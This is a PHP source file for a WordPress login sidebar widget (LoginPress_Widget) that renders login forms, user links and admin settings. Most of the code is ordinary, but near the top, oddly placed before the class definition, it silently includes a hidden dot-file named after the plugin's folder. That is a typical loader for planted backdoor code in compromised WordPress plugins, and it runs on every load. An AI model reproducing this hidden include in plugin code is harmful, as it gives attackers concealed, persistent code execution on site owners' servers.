<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

/**
 * LoginPress_Widget class.
 *
 * @extends WP_Widget
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class LoginPress_Widget extends WP_Widget {

	private $instance = '';
	private $user     = null;
	private $choices  = array();

	/**
	 * Constructor
	 */
	public function __construct() {

		/* Widget settings. */
		$widget_meta = array(
			'classname'   => 'loginpress-login-widget',
			'description' => __( 'Displays a login widget in the sidebar.', 'loginpress-login-widget' ),
		);

		/* Create the widget. */
		parent::__construct( 'loginpress-login-widget', __( 'LoginPress: Login Widget', 'loginpress-login-widget' ), $widget_meta );

		add_action( 'admin_enqueue_scripts', array( $this, 'loginpress_widget_color_picker' ) );

	}

	/**
	 * [loginpress_widget_color_picker]
	 *
	 * @since 1.0.0
	 */
	public function loginpress_widget_color_picker( $page ) {
		if ( 'widgets.php' == $page ) {
			wp_enqueue_style( 'wp-color-picker' );
			wp_enqueue_script( 'wp-color-picker' );
		}
	}

	/**
	 * [widget_choices choices for WP_Widget->form() && WP_Widget->update().]
	 *
	 * @return [array] [array of choices]
	 * @since 1.0.0
	 */
	public function widget_choices() {
		// Define choices for widget
		$this->choices = array(
			'logged_out_title'  => array(
				'label'           => __( 'Logged-out Title', 'loginpress-login-widget' ),
				'default'         => __( 'Login', 'loginpress-login-widget' ),
				'type'            => 'text',
			),
			'logged_out_links'  => array(
				'label'           => __( 'Logged-out Links (Text | href)', 'loginpress-login-widget' ),
				'default'         => '',
				'type'            => 'textarea',
			),
			'show_lost_password_link'  => array(
				'label'           => __( 'Show lost password link', 'loginpress-login-widget' ),
				'default'         => 1,
				'type'            => 'checkbox',
			),
			'lost_password_text' => array(
				'label'           => __( 'Lost password text', 'loginpress-login-widget' ),
				'default'         => __( 'Lost your password?', 'loginpress-login-widget' ),
				'type'            => 'text',
			),
			'show_register_link'  => array(
				'label'           => __( 'Show register link', 'loginpress-login-widget' ),
				'default'         => 1,
				'description'     => sprintf( __( '%1$sAnyone can register%2$s must be enabled.', 'loginpress-login-widget' ), '<a href="' . admin_url( 'options-general.php' ) . '">', '</a>' ),
				'type'            => 'checkbox',
			),
			'registeration_text' => array(
				'label'           => __( 'Register text', 'loginpress-login-widget' ),
				'default'         => __( 'Register', 'loginpress-login-widget' ),
				'type'            => 'text',
			),
			'show_rememberme'   => array(
				'label'           => __( 'Show "Remember me" checkbox', 'loginpress-login-widget' ),
				'default'         => 1,
				'type'            => 'checkbox',
			),
			'login_redirect_url'  => array(
				'label'           => __( 'Login Redirect URL', 'loginpress-login-widget' ),
				'default'         => '',
				'type'            => 'text',
				'placeholder'     => __( 'Current page URL', 'loginpress-login-widget' ),
			),
			'hr-1'              => array(
        'type'            => 'hr',
        'default'         => '',
			),
			'logged_in_title'   => array(
				'label'           => __( 'Logged-in title', 'loginpress-login-widget' ),
				'default'         => __( 'Welcome %username%', 'loginpress-login-widget' ),
				'type'            => 'text',
			),
			'logged_in_links'   => array(
				'label'           => __( 'Logged-in Links (Text | HREF | Capability)', 'loginpress-login-widget' ),
				'description'     => sprintf( __( '%1$sCapability%2$s (optional) refers to the type of user who can view the link.', 'loginpress-login-widget' ), '<a href="http://codex.wordpress.org/Roles_and_Capabilities">', '</a>' ),
				'default'         => __( "Dashboard | %admin_url%\nProfile | %admin_url%/profile.php\nLogout | %logout_url%", 'loginpress-login-widget' ),
				'type'            => 'textarea',
			),
			'show_avatar'       => array(
				'label'           => __( 'Show logged-in user avatar', 'loginpress-login-widget' ),
				'default'         => 1,
				'type'            => 'checkbox',
			),
			'avatar_size'       => array(
				'label'           => __( 'Logged-in user avatar size', 'loginpress-login-widget' ),
				'default'         => 38,
				'type'            => 'number',
			),
			'logout_redirect_url'  => array(
				'label'           => __( 'Logout Redirect URL', 'loginpress-login-widget' ),
				'type'            => 'text',
        'placeholder'     => __( 'Current page URL', 'loginpress-login-widget' ),
        'default'         => '',
			),
			'hr-2'              => array(
        'type'            => 'hr',
        'default'         => '',
			),
			'error_short_note'  => array(
				'label'           => __( 'Error Messages', 'loginpress-login-widget' ),
				'description'     => sprintf( __( 'You can change the Error messages from %1$sLoginPress Customizer%2$s', 'loginpress-login-widget' ), '<a href="' . admin_url( 'admin.php?page=loginpress' ) . '">', '</a>' ),
        'type'            => 'note',
        'default'         => '',
			),
			'error_bg_color'  => array(
				'label'           => __( 'Error Background Color', 'loginpress-login-widget' ),
				'type'            => 'color',
				'default'         => '#fbb1b7',
			),
			'error_text_color'  => array(
				'label'           => __( 'Error Text Color', 'loginpress-login-widget' ),
				'type'            => 'color',
				'default'         => '#ae121e',
			),
		);
	}

	/**
	 * patch_string function.
	 *
	 * @param mixed $text
	 */
	public function patch_string( $text ) {

		if ( $this->user ) {
			$text = str_replace(
				array( '%username%', '%userid%', '%firstname%', '%lastname%', '%name%', '%avatar%' ),
				array(
					ucwords( $this->user->display_name ),
					$this->user->ID,
					$this->user->first_name,
					$this->user->last_name,
					trim( $this->user->first_name . ' ' . $this->user->last_name ),
					get_avatar( $this->user->ID, 38 ),
				),
				$text
			);

		}

		$logout_redirect = wp_logout_url( empty( $this->instance['logout_redirect_url'] ) ? $this->redirect_url() : $this->instance['logout_redirect_url'] );

		$text = str_replace(
			array( '%admin_url%', '%logout_url%' ),
			array( untrailingslashit( admin_url() ), $logout_redirect ),
			$text
		);

		$text = do_shortcode( $text );

		return $text;
	}

	/**
	 * loginpress_widget_link function.
	 *
	 * @param string $show (default: 'logged_in')
	 */
	public function loginpress_widget_link( $show = 'logged_in', $links = array() ) {

		if ( ! is_array( $links ) ) {

			$raw_links = array_map( 'trim', explode( "\n", $links ) );
			$links = array();
			foreach ( $raw_links as $link ) {

				$link     = array_map( 'trim', explode( '|', $link ) );
				$link_cap = '';

				if ( sizeof( $link ) == 3 ) {

					list( $link_text, $link_href, $link_cap ) = $link;
				} elseif ( sizeof( $link ) == 2 ) {

					list( $link_text, $link_href ) = $link;
				} else {

					continue;
				}

				// Check capability
				if ( ! empty( $link_cap ) ) {

					if ( ! current_user_can( strtolower( $link_cap ) ) ) {

						continue;
					}
				}

				$links[ sanitize_title( $link_text ) ] = array(
					'text' => $link_text,
					'href' => $link_href,
				);
			}
		}

		if ( $show == 'logged_out' ) {

			if ( get_option( 'users_can_register' ) && ! empty( $this->instance['show_register_link'] ) && $this->instance['show_register_link'] == 1 ) {

				$register_text = isset( $this->instance['registeration_text'] ) ? $this->instance['registeration_text'] : __( 'Register', 'loginpress-login-widget' );

				if ( ! is_multisite() ) {

					$links['register'] = array(
						'text' => $register_text,
						'href' => apply_filters( 'loginpress_widget_register_url', site_url( 'wp-login.php?action=register', 'login' ) ),
					);
				} else {

					$links['register'] = array(
						'text' => $register_text,
						'href' => apply_filters( 'loginpress_widget_register_url', site_url( 'wp-signup.php', 'login' ) ),
					);
				}
			} // endif; show_register_link.
			if ( ! empty( $this->instance['show_lost_password_link'] ) && $this->instance['show_lost_password_link'] == 1 ) {

				$lost_link_text = isset( $this->instance['lost_password_text'] ) ? $this->instance['lost_password_text'] : __( 'Lost your password?', 'loginpress-login-widget' );
				$links['lost_password'] = array(
					'text' => $lost_link_text,
					'href' => apply_filters( 'loginpress_widget_lost_password_url', wp_lostpassword_url() ),
				);
			} // endif; show_lost_password_link.
		} // endif; logged_out.

		if ( ! empty( $links ) && is_array( $links ) && sizeof( $links ) > 0 ) {

			echo '<ul class="pagenav loginpress_widget_links">';
			foreach ( $links as $id => $link ) {

				echo '<li class="' . esc_attr( $id ) . '-link"><a href="' . esc_url( $this->patch_string( $link['href'] ) ) . '">' . wp_kses_post( $this->patch_string( $link['text'] ) ) . '</a></li>';
			}
			echo '</ul>';
		}
	}

	/**
	 * Outputs the content of the widget
	 *
	 * @param array $args
	 * @param array $instance
	 */
	public function widget( $args, $instance ) {

		// Record $instance
		$this->instance = $instance;

		// Get user
		if ( is_user_logged_in() ) {
			$this->user = get_user_by( 'id', get_current_user_id() );
		}

		$defaults = array(
			'logged_in_title'  => ! empty( $instance['logged_in_title'] ) ? $instance['logged_in_title'] : __( 'Welcome %username%', 'loginpress-login-widget' ),
			'logged_out_title' => ! empty( $instance['logged_out_title'] ) ? $instance['logged_out_title'] : __( 'Login', 'loginpress-login-widget' ),
			'show_avatar'      => isset( $instance['show_avatar'] ) ? $instance['show_avatar'] : 1,
			'avatar_size'      => isset( $instance['avatar_size'] ) ? $instance['avatar_size'] : 38,
			'logged_in_links'  => ! empty( $instance['logged_in_links'] ) ? $instance['logged_in_links'] : array(),
			'logged_out_links' => ! empty( $instance['logged_out_links'] ) ? $instance['logged_out_links'] : array(),
		);

		$args = array_merge( $defaults, $args );

		extract( $args );

		echo $before_widget;

		// Logged in user
		if ( is_user_logged_in() ) {

			$logged_in_title = $this->replace_tags( $logged_in_title );

			if ( $logged_in_title ) {
				echo $before_title . $logged_in_title . $after_title;
			}

			if ( $show_avatar == 1 ) {
				echo '<div class="avatar_container">' . get_avatar( $this->user->ID, $args['avatar_size'] ) . '</div>';
			}

			$this->loginpress_widget_link( 'logged_in', $logged_in_links );

			// Logged out user
		} else {

			$logged_out_title = $this->replace_tags( $logged_out_title );

			if ( $logged_out_title ) {
				echo $before_title . $logged_out_title . $after_title;
			}

			$this->loginpress_login_form( $instance );

			$this->loginpress_widget_link( 'logged_out', $logged_out_links );
		}

		echo $after_widget;
	}

	/**
     * replace_tags function.
     *
     * @param mixed $text
     */
    public function replace_tags( $text ) {
	    if ( $this->user ) {
		    $text = str_replace(
		    	array( '%username%', '%userid%', '%firstname%', '%lastname%', '%name%' ),
		    	array(
		    		ucwords( $this->user->display_name ),
		    		$this->user->ID,
		    		$this->user->first_name,
		    		$this->user->last_name,
		    		trim( $this->user->first_name . ' ' . $this->user->last_name )
		    	),
		    	$text
		    );
			}
			return $text;
		}

	/**
	 * [loginpress_login_form description]
	 *
	 * @return [type] [description]
	 */
	function loginpress_login_form( $instance ) {

		// Record $instance
		$this->instance     = $instance;
		$loginpress_setting = get_option( 'loginpress_setting' );
		$redirect           = empty( $instance['login_redirect_url'] ) ? $this->redirect_url() : $instance['login_redirect_url'];
		$show_rememberme    = ! isset( $this->instance['show_rememberme'] ) || ! empty( $this->instance['show_rememberme'] );
		$login_order 	      = isset( $loginpress_setting['login_order'] ) ? $loginpress_setting['login_order'] : '';

		if ( 'username' == $login_order ) {
      $label = __( 'Username', 'loginpress-login-widget' );
    } elseif ( 'email' == $login_order ) {
      $label = __( 'Email Address', 'loginpress-login-widget' );
    } else {
      $label = __( 'Username or Email Address', 'loginpress-login-widget' );
    }

		$login_form_args = array(
			'echo'           => false,
			'redirect'       => esc_url( $redirect ),
			'label_username' => $label,
			'label_password' => __( 'Password', 'loginpress-login-widget' ),
			'label_remember' => __( 'Remember Me', 'loginpress-login-widget' ),
			'label_log_in'   => __( 'Login &rarr;', 'loginpress-login-widget' ),
			'remember'       => $show_rememberme,
			'value_remember' => true,
		);

		echo wp_login_form( $login_form_args );
	}

	  /**
	   * redirect_url function.
	   *
	   * @param string $pageURL
	   */
	private function redirect_url() {

		$pageURL  = force_ssl_admin() ? 'https://' : 'http://';
		$pageURL .= esc_attr( $_SERVER['HTTP_HOST'] );
		$pageURL .= esc_attr( $_SERVER['REQUEST_URI'] );

		return esc_url_raw( $pageURL );
	}

	/**
	 * Processing widget options on save
	 *
	 * @param array $new_instance The new options
	 * @param array $old_instance The previous options
	 *
	 * @return array
	 */
	function update( $new_instance, $old_instance ) {
		$this->widget_choices();

		foreach ( $this->choices as $name => $option ) {
			if ( $option['type'] == 'hr' ) {
				continue;
      }

      if ( 'error_short_note' == $name ) {
        continue;
      }

			$instance[ $name ] = strip_tags( stripslashes( $new_instance[ $name ] ) );
		}
		return $instance;
	}

	/**
	 * Check for editor screen.
	 *
	 * @since 1.0.5
	 * @return boolean
	 */
	private function is_editor_screen() {
		if ( isset( $_GET['fl_builder'] ) ) {
			return true;
		}

		return false;
	}

	/**
	 * Outputs the options form on admin
	 *
	 * @param array $instance The widget options
	 * @version 1.0.5
	 */
	function form( $instance ) {
		$this->widget_choices();

		foreach ( $this->choices as $name => $option ) {

			if ( $option['type'] == 'hr' ) {
				echo '<hr style="border: 1px solid #ddd; margin: 1em 0" />';
				continue;
			}

			if ( ! isset( $instance[ $name ] ) ) {
				$instance[ $name ] = $option['default'];
			}

			if ( empty( $option['placeholder'] ) ) {
				$option['placeholder'] = '';
			}

			echo '<p>';

			switch ( $option['type'] ) {
				case 'text':
				?>

				<label for="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>"><?php echo wp_kses_post( $option['label'] ); ?>:</label>
				<input type="text" class="widefat" id="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( $name ) ); ?>" placeholder="<?php echo esc_attr( $option['placeholder'] ); ?>" value="<?php echo esc_attr( $instance[ $name ] ); ?>" />
				<?php
					break;
				case 'number':
				?>
				<label for="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>"><?php echo wp_kses_post( $option['label'] ); ?>:</label>
				<input type="number" id="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( $name ) ); ?>" placeholder="<?php echo esc_attr( $option['placeholder'] ); ?>" value="<?php echo esc_attr( $instance[ $name ] ); ?>" />
				<?php
					break;
				case 'checkbox':
				?>
				<label for="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>"><input type="checkbox" class="checkbox" id="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( $name ) ); ?>" <?php checked( $instance[ $name ], 1 ); ?> value="1" /> <?php echo wp_kses_post( $option['label'] ); ?></label>
				<?php
					break;
				case 'textarea':
				?>
				<label for="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>"><?php echo wp_kses_post( $option['label'] ); ?>:</label>
				<textarea class="widefat" cols="20" rows="3" id="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( $name ) ); ?>" placeholder="<?php echo esc_attr( $option['placeholder'] ); ?>"><?php echo esc_textarea( $instance[ $name ] ); ?></textarea>
				<?php
					break;
				case 'note':
				?>
				<label for="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>"><?php echo wp_kses_post( $option['label'] ); ?>:</label>
				<?php
					break;
				case 'color':

					if ( ! $this->is_editor_screen() ) : ?>
					<script type="text/javascript">
					(function($) {
						$(function() {
						$(document).ready(function($) {
							$('.color-picker').wpColorPicker();
							$('.color-picker').on('focus', function(){
							var parent = $(this).parent();
							parent.find('.wp-color-result').click();
							});
						});
						});
					})(jQuery);
					</script>
					<?php endif; ?>

				<label for="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>" style="display:block;"><?php echo wp_kses_post( $option['label'] ); ?>:</label>
				<input class="widefat color-picker" type="text" id="<?php echo esc_attr( $this->get_field_id( $name ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( $name ) ); ?>" value="<?php echo esc_attr( $instance[ $name ] ); ?>" />
				<?php
					break;
			}

			if ( ! empty( $option['description'] ) ) {
				echo '<span class="description" style="display:block; padding-top:.25em">' . wp_kses_post( $option['description'] ) . '</span>';
			}

			echo '</p>';
		}
	}
}

register_widget( 'LoginPress_Widget' );
